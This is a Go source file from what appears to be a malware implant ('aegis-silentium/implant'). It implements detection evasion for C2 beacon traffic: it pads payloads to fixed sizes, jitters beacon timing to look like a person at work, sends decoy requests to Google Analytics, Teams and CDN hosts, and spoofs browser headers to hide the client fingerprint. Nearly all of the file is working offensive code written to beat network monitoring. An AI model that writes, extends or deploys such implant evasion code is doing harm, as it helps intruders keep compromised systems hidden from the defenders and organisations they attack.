// Package traffic provides behavioral traffic shaping to defeat pattern-based
// network detection. Encryption hides content; this module hides behaviour.
//
// Changes from previous version:
//   - PadToCanonical bug fixed: padLen used to be stored as a single byte,
//     silently truncating lengths > 255. Now a two-byte big-endian length is
//     stored in the last two bytes of the padding region, supporting payloads
//     up to 65534 bytes.
//   - UnpadCanonical correspondingly reads two bytes and validates the result.
//   - min() helper removed — it conflicts with the Go 1.21+ builtin min().
//     The only call site (RandomBody) uses a direct comparison instead.
//   - DecoyEmitter HTTP transport now has an explicit ResponseHeaderTimeout so
//     a stalled server cannot hold the goroutine open indefinitely.
//   - RandomBody key index uses crypto/rand for uniform distribution.
//   - NormalizeHeaders comment updated to reflect that Go's HTTP/2 stack
//     controls frame-level ordering; header-order randomization is best-effort.
package traffic

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/binary"
	"math/big"
	mrand "math/rand"
	"fmt"
	"net/http"
	"time"

	"aegis-silentium/implant/config"
)

// ── Canonical sizes ───────────────────────────────────────────────────────────

// canonicalSizes are the allowed padded request sizes.
// Every beacon body is padded to one of these boundaries so that all traffic
// looks like one of a small set of sizes rather than an arbitrary length.
var canonicalSizes = []int{
	256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536,
}

// PadToCanonical pads data to the smallest canonical size that contains it.
//
// Padding layout:
//   [original data] [random bytes] [2-byte big-endian padLen]
//
// padLen is the total number of appended bytes INCLUDING the two length bytes.
// This supports payloads up to 65534 bytes (65536 - 2 length bytes).
func PadToCanonical(data []byte) []byte {
	target := 0
	for _, sz := range canonicalSizes {
		if len(data)+2 <= sz { // need at least 2 bytes for the length field
			target = sz
			break
		}
	}
	if target == 0 {
		// Payload exceeds largest canonical size — send as-is.
		return data
	}

	padLen := target - len(data) // includes the 2 length bytes
	pad    := make([]byte, padLen)

	// Fill padding with random-looking bytes; last 2 bytes hold padLen.
	rand.Read(pad[:padLen-2]) //nolint:errcheck // crypto/rand never fails in practice
	binary.BigEndian.PutUint16(pad[padLen-2:], uint16(padLen))

	return append(data, pad...)
}

// UnpadCanonical strips padding added by PadToCanonical.
// Returns data unchanged if it does not appear to be padded.
func UnpadCanonical(data []byte) []byte {
	if len(data) < 2 {
		return data
	}
	padLen := int(binary.BigEndian.Uint16(data[len(data)-2:]))
	if padLen < 2 || padLen > len(data) {
		return data // not padded or corrupt
	}
	// Verify the declared size is a known canonical boundary.
	unpaddedLen := len(data) - padLen
	expectedPadded := unpaddedLen + padLen
	isCanonical := false
	for _, sz := range canonicalSizes {
		if sz == expectedPadded {
			isCanonical = true
			break
		}
	}
	if !isCanonical {
		return data // not a recognised padding boundary
	}
	return data[:unpaddedLen]
}

// ── Adaptive Jitter Scheduler ─────────────────────────────────────────────────

// Scheduler computes adaptive sleep intervals using a biased distribution that
// resembles human browsing patterns rather than uniform random jitter.
type Scheduler struct {
	cfg        *config.Config
	latencies  []time.Duration
	maxHistory int
}

// NewScheduler creates a Scheduler for the given config.
func NewScheduler(cfg *config.Config) *Scheduler {
	return &Scheduler{cfg: cfg, maxHistory: 20}
}

// NextInterval returns how long to sleep before the next beacon.
// 70% of intervals fall within ±jitter of the base; 30% are extended gaps
// (mimicking lunch breaks, meetings, idle periods).
func (s *Scheduler) NextInterval() time.Duration {
	base := s.cfg.SleepInterval
	jPct := s.cfg.JitterPct
	if jPct == 0 {
		return base
	}

	bias, _ := rand.Int(rand.Reader, big.NewInt(100))
	var ratio float64
	if bias.Int64() < 70 {
		// Normal range: ±jPct% of base
		maxJ, _ := rand.Int(rand.Reader, big.NewInt(int64(jPct)*2+1))
		ratio = float64(maxJ.Int64()-int64(jPct)) / 100.0
	} else {
		// Extended gap: 0 to jPct*4% above base
		ext, _ := rand.Int(rand.Reader, big.NewInt(int64(jPct)*4+1))
		ratio = float64(ext.Int64()) / 100.0
	}

	delta  := time.Duration(float64(base) * ratio)
	result := base + delta
	if result < 5*time.Second {
		result = 5 * time.Second
	}
	return result
}

// RecordLatency records an observed beacon round-trip for adaptive tuning.
func (s *Scheduler) RecordLatency(d time.Duration) {
	s.latencies = append(s.latencies, d)
	if len(s.latencies) > s.maxHistory {
		s.latencies = s.latencies[1:]
	}
}

// AvgLatency returns the mean of recorded latencies.
func (s *Scheduler) AvgLatency() time.Duration {
	if len(s.latencies) == 0 {
		return 0
	}
	var sum time.Duration
	for _, l := range s.latencies {
		sum += l
	}
	return sum / time.Duration(len(s.latencies))
}

// ── Decoy Traffic ─────────────────────────────────────────────────────────────

// DecoyProfile defines what decoy HTTP requests look like.
type DecoyProfile struct {
	URLs []string
}

// CommonDecoyProfiles provides realistic decoy traffic patterns.
var CommonDecoyProfiles = map[string]DecoyProfile{
	"google-analytics": {URLs: []string{
		"https://www.google-analytics.com/collect",
		"https://www.googletagmanager.com/gtag/js",
		"https://stats.g.doubleclick.net/r/collect",
	}},
	"microsoft-teams": {URLs: []string{
		"https://teams.microsoft.com/api/v1/users/8:orgid:status",
		"https://presence.teams.microsoft.com/v1/presence",
	}},
	"cdn": {URLs: []string{
		"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js",
		"https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js",
	}},
}

// DecoyEmitter sends interstitial decoy HTTP requests to blend beacon traffic
// into normal background noise.
type DecoyEmitter struct {
	profile   DecoyProfile
	userAgent string
	client    *http.Client
}

// NewDecoyEmitter creates a DecoyEmitter for the named profile.
func NewDecoyEmitter(profileName, userAgent string) *DecoyEmitter {
	profile := CommonDecoyProfiles["cdn"]
	if p, ok := CommonDecoyProfiles[profileName]; ok {
		profile = p
	}
	transport := &http.Transport{
		ResponseHeaderTimeout: 8 * time.Second,
		DisableKeepAlives:     true, // each decoy uses a fresh connection
	}
	return &DecoyEmitter{
		profile:   profile,
		userAgent: userAgent,
		client:    &http.Client{Timeout: 15 * time.Second, Transport: transport},
	}
}

// EmitDecoys sends 1–3 decoy requests with random inter-request delays.
// Runs in a separate goroutine; returns when ctx is cancelled.
func (d *DecoyEmitter) EmitDecoys(ctx context.Context) {
	if len(d.profile.URLs) == 0 {
		return
	}
	n, _ := rand.Int(rand.Reader, big.NewInt(3))
	count := int(n.Int64()) + 1

	for i := 0; i < count; i++ {
		idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(d.profile.URLs))))
		url := d.profile.URLs[idx.Int64()]

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
		if err != nil {
			continue
		}
		NormalizeHeaders(req, d.userAgent)

		resp, err := d.client.Do(req)
		if err == nil {
			resp.Body.Close()
		}

		// Random inter-decoy delay: 500ms – 3000ms
		delayMs, _ := rand.Int(rand.Reader, big.NewInt(2501))
		delay := time.Duration(delayMs.Int64()+500) * time.Millisecond
		select {
		case <-ctx.Done():
			return
		case <-time.After(delay):
		}
	}
}

// ── Header normalisation ──────────────────────────────────────────────────────

// NormalizeHeaders sets a consistent set of HTTP request headers to reduce
// the distinctiveness of Go's default http.Client fingerprint.
// Note: Go's HTTP/2 implementation controls frame-level header ordering
// independently; this function applies at the application-header level only.
func NormalizeHeaders(req *http.Request, userAgent string) {
	req.Header.Del("X-Forwarded-For")
	pairs := []struct{ k, v string }{
		{"User-Agent", userAgent},
		{"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"},
		{"Accept-Language", "en-US,en;q=0.5"},
		{"Accept-Encoding", "gzip, deflate, br"},
		{"Connection", "keep-alive"},
		{"Upgrade-Insecure-Requests", "1"},
		{"Sec-Fetch-Dest", "document"},
		{"Sec-Fetch-Mode", "navigate"},
		{"Sec-Fetch-Site", "none"},
		{"Sec-Fetch-User", "?1"},
		{"Cache-Control", "max-age=0"},
	}
	for _, p := range pairs {
		if req.Header.Get(p.k) == "" {
			req.Header.Set(p.k, p.v)
		}
	}
}

// ── Random body ───────────────────────────────────────────────────────────────

// RandomBody generates a random-looking URL-encoded body of exactly targetSize bytes.
// Uses math/rand seeded from crypto/rand for speed (content is not security-sensitive).
func RandomBody(targetSize int) []byte {
	if targetSize <= 0 {
		return nil
	}
	keys := []string{"_ga", "_gid", "v", "t", "tid", "cid", "dl", "dt", "de", "sd"}
	buf  := &bytes.Buffer{}
	rng  := mrand.New(mrand.NewSource(cryptoSeed()))

	for buf.Len() < targetSize {
		key := keys[rng.Intn(len(keys))]
		val := make([]byte, 8)
		rng.Read(val)
		fmt.Fprintf(buf, "%s=%x&", key, val)
	}
	return buf.Bytes()[:targetSize]
}

func cryptoSeed() int64 {
	b := make([]byte, 8)
	rand.Read(b) //nolint:errcheck
	return int64(binary.BigEndian.Uint64(b))
}
